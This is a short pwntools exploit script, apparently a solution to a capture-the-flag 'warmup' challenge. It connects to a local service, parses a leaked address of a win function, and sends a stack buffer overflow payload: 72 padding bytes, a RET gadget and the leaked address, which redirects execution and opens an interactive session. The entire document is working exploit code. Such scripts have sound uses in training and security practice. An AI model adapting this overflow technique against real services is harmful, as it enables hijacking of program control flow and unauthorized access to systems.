from pwn import *


elf = context.binary = ELF("./warmup")


# p = process()
p = remote("0.0.0.0",8000)
p.recvuntil("WOW:")

WIN_LEAK = int(p.recvline().decode()[2:],16)
OFFSET = b"A" * 72

payload = flat([
    OFFSET,
    0x00000000004004a1, # RET, 
    WIN_LEAK,
])

# gdb.attach(p)
p.sendline(payload)
p.interactive()